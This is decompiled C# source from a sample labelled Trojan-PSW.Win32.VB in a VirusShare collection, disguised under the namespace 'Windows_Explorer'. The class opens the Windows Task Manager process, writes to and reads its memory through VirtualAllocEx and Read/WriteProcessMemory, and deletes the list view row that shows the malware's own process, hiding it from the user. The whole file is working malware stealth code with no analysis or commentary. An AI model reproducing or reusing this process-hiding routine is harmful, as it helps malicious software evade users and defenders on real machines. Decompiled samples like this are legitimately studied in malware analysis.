// Decompiled with JetBrains decompiler
// Type: Windows_Explorer.GetItems
// Assembly: wqeqerwt4354wsey56sey5ts765y54, Version=7.52.5.2, Culture=neutral, PublicKeyToken=null
// MVID: 3FC4189E-BF6F-40C3-B48B-A4DA54DCDC94
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00006-msil\Trojan-PSW.Win32.VB.chm-8bf17b67595d474959c887391b17692103cd2a30a4e2cd4f51f483ad8140b647.exe

using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32.SafeHandles;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;

namespace Windows_Explorer
{
  [StandardModule]
  internal sealed class GetItems
  {
    private static IntPtr listViewHandle;
    public const uint LVM_FIRST = 4096;
    public const uint LVM_DELETEITEM = 4104;
    public const string kernel32 = "kernel32";
    public const string user32 = "user32";
    public const uint LVM_GETITEMCOUNT = 4100;
    public const uint LVM_GETITEMTEXT = 4141;
    public const uint LVM_GETHEADER = 4127;
    public const uint HDM_GETIEMA = 4611;
    public const uint HDM_GETITEMW = 4619;
    public const uint HDM_GETITEMCOUNT = 4608;
    public const uint HDM_GETUNICODEFORMAT = 8198;
    public const uint HDI_TEXT = 2;
    public const uint MEM_COMMIT = 4096;
    public const uint MEM_RELEASE = 32768;
    public const uint PAGE_READWRITE = 4;
    public const uint PROCESS_VM_READ = 16;
    public const uint PROCESS_VM_WRITE = 32;
    public const uint PROCESS_VM_OPERATION = 8;
    public const uint WM_GETTEXT = 13;
    public const uint WM_GETTEXTLENGTH = 14;

    [DebuggerNonUserCode]
    static GetItems()
    {
    }

    [DllImport("kernel32", SetLastError = true)]
    public static extern GetItems.SafeProcessHandle OpenProcess(
      uint dwDesiredAccess,
      bool bInheritHandle,
      int dwProcessId);

    [DllImport("kernel32", EntryPoint = "ReadProcessMemory", CharSet = CharSet.Unicode, SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool ReadProcessMemoryW(
      GetItems.SafeProcessHandle hProcess,
      IntPtr lpBaseAddress,
      StringBuilder lpBuffer,
      int nSize,
      ref int bytesRead);

    [DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool ReadProcessMemory(
      GetItems.SafeProcessHandle hProcess,
      IntPtr lpBaseAddress,
      StringBuilder lpBuffer,
      int nSize,
      ref int bytesRead);

    [DllImport("kernel32", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool ReadProcessMemory(
      GetItems.SafeProcessHandle hProcess,
      IntPtr lpBaseAddress,
      ref GetItems.LV_ITEM lpBuffer,
      int nSize,
      ref int bytesRead);

    [DllImport("kernel32", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool ReadProcessMemory(
      GetItems.SafeProcessHandle hProcess,
      IntPtr lpBaseAddress,
      ref GetItems.HDITEM lpBuffer,
      int nSize,
      ref int bytesRead);

    [DllImport("kernel32", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool ReadProcessMemory(
      GetItems.SafeProcessHandle hProcess,
      IntPtr lpBaseAddress,
      IntPtr lpBuffer,
      int nSize,
      ref int bytesRead);

    [DllImport("user32", SetLastError = true)]
    public static extern int SendMessage(IntPtr hWnd, uint message, IntPtr wParam, IntPtr lParam);

    [DllImport("user32", EntryPoint = "SendMessageA", SetLastError = true)]
    public static extern IntPtr GetHeaderSendMessage(
      IntPtr hWnd,
      uint message,
      IntPtr wParam,
      IntPtr lParam);

    [DllImport("user32", SetLastError = true)]
    public static extern int SendMessage(
      IntPtr hWnd,
      uint message,
      int wParam,
      StringBuilder lParam);

    [DllImport("user32", SetLastError = true)]
    public static extern int SendMessage(IntPtr hWnd, uint message, int wParam, IntPtr lParam);

    [DllImport("kernel32", SetLastError = true)]
    public static extern IntPtr VirtualAllocEx(
      GetItems.SafeProcessHandle hProcess,
      IntPtr lpAddress,
      int dwSize,
      uint flAllocationType,
      uint flProtect);

    [DllImport("kernel32", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool VirtualFreeEx(
      GetItems.SafeProcessHandle hProcess,
      IntPtr lpAddress,
      int dwSize,
      uint dwFreeType);

    [DllImport("kernel32", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool WriteProcessMemory(
      GetItems.SafeProcessHandle hProcess,
      IntPtr lpBaseAddress,
      ref GetItems.LV_ITEM lpBuffer,
      int nSize,
      ref int lpNumberOfBytesWritten);

    [DllImport("kernel32", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool WriteProcessMemory(
      GetItems.SafeProcessHandle hProcess,
      IntPtr lpBaseAddress,
      ref GetItems.HDITEM lpBuffer,
      int nSize,
      ref int lpNumberOfBytesWritten);

    public static bool GetListView(IntPtr handle, IntPtr lvhandle)
    {
      GetItems.listViewHandle = lvhandle;
      int dwProcessId = -1;
      bool listView;
      try
      {
        Process[] processesByName = Process.GetProcessesByName("taskmgr");
        int index = 0;
        while (index < processesByName.Length)
        {
          Process process = processesByName[index];
          if (Operators.CompareString(process.MainWindowTitle, "Windows Task Manager", false) == 0)
            dwProcessId = process.Id;
          checked { ++index; }
        }
        if (dwProcessId == -1)
          throw new ArgumentException("Could not find the process specified", "processName");
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        listView = false;
        ProjectData.ClearProjectError();
        goto label_22;
      }
      GetItems.SafeProcessHandle hProcess = (GetItems.SafeProcessHandle) null;
      try
      {
        hProcess = GetItems.OpenProcess(56U, false, dwProcessId);
        if (hProcess == null && Marshal.GetLastWin32Error() == 0)
          throw new Win32Exception();
        int num1 = checked (GetItems.SendMessage(GetItems.listViewHandle, 4100U, IntPtr.Zero, IntPtr.Zero) - 1);
        int num2 = 0;
        while (num2 <= num1)
        {
          if (new ListViewItem(GetItems.GetItem(num2, 0, hProcess)).Text.Contains(TMListViewDelete.MyProc))
            GetItems.SendMessage(GetItems.listViewHandle, 4104U, num2, IntPtr.Zero);
          checked { ++num2; }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        listView = false;
        ProjectData.ClearProjectError();
        goto label_22;
      }
      finally
      {
        if (hProcess != null)
        {
          hProcess.Close();
          hProcess.Dispose();
        }
      }
      return true;
label_22:
      return listView;
    }

    private static string GetItem(int row, int subitem, GetItems.SafeProcessHandle hProcess)
    {
      GetItems.LV_ITEM structure = new GetItems.LV_ITEM();
      structure.cchTextMax = 260;
      structure.mask = 1U;
      structure.iItem = row;
      structure.iSubItem = subitem;
      StringBuilder stringBuilder = new StringBuilder(260);
      IntPtr lpAddress;
      try
      {
        lpAddress = GetItems.VirtualAllocEx(hProcess, IntPtr.Zero, 260, 4096U, 4U);
        structure.pszText = lpAddress;
        IntPtr num1;
        try
        {
          num1 = GetItems.VirtualAllocEx(hProcess, IntPtr.Zero, structure.Size(), 4096U, 4U);
          GetItems.SafeProcessHandle hProcess1 = hProcess;
          IntPtr lpBaseAddress1 = num1;
          ref GetItems.LV_ITEM local1 = ref structure;
          int nSize1 = structure.Size();
          int num2 = 0;
          ref int local2 = ref num2;
          if (!GetItems.WriteProcessMemory(hProcess1, lpBaseAddress1, ref local1, nSize1, ref local2))
            throw new Win32Exception();
          GetItems.SendMessage(GetItems.listViewHandle, 4141U, row, num1);
          GetItems.SafeProcessHandle hProcess2 = hProcess;
          IntPtr lpBaseAddress2 = lpAddress;
          StringBuilder lpBuffer = stringBuilder;
          int num3 = 0;
          ref int local3 = ref num3;
          if (!GetItems.ReadProcessMemory(hProcess2, lpBaseAddress2, lpBuffer, 260, ref local3))
            throw new Win32Exception();
          GetItems.SafeProcessHandle hProcess3 = hProcess;
          IntPtr lpBaseAddress3 = num1;
          ref GetItems.LV_ITEM local4 = ref structure;
          int nSize2 = Marshal.SizeOf((object) structure);
          int num4 = 0;
          ref int local5 = ref num4;
          if (!GetItems.ReadProcessMemory(hProcess3, lpBaseAddress3, ref local4, nSize2, ref local5))
            throw new Win32Exception();
        }
        finally
        {
          if (!num1.Equals((object) IntPtr.Zero) && !GetItems.VirtualFreeEx(hProcess, num1, 0, 32768U))
            throw new Win32Exception();
        }
      }
      finally
      {
        if (!lpAddress.Equals((object) IntPtr.Zero) && !GetItems.VirtualFreeEx(hProcess, lpAddress, 0, 32768U))
          throw new Win32Exception();
      }
      return stringBuilder.ToString();
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct LV_ITEM
    {
      public uint mask;
      public int iItem;
      public int iSubItem;
      public uint state;
      public uint stateMask;
      public IntPtr pszText;
      public int cchTextMax;
      public int iImage;
      public IntPtr lParam;
      public int iIndent;
      public int iGroupId;
      public int cColumns;
      public IntPtr puColumns;
      public IntPtr piColFmt;
      public int iGroup;

      public int Size() => Marshal.SizeOf((object) this);
    }

    public struct HDITEM
    {
      public uint mask;
      public int cxy;
      public IntPtr pszText;
      public IntPtr hbm;
      public int cchTextMax;
      public int fmt;
      public IntPtr lParam;
      public int iImage;
      public int iOrder;

      public int Size() => Marshal.SizeOf((object) this);
    }

    internal sealed class SafeProcessHandle : SafeHandleZeroOrMinusOneIsInvalid
    {
      [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
      public static extern bool CloseHandle(IntPtr hObject);

      public SafeProcessHandle()
        : base(true)
      {
      }

      public SafeProcessHandle(IntPtr handle)
        : base(true)
      {
        this.SetHandle(handle);
      }

      protected override bool ReleaseHandle() => GetItems.SafeProcessHandle.CloseHandle(this.handle);
    }
  }
}
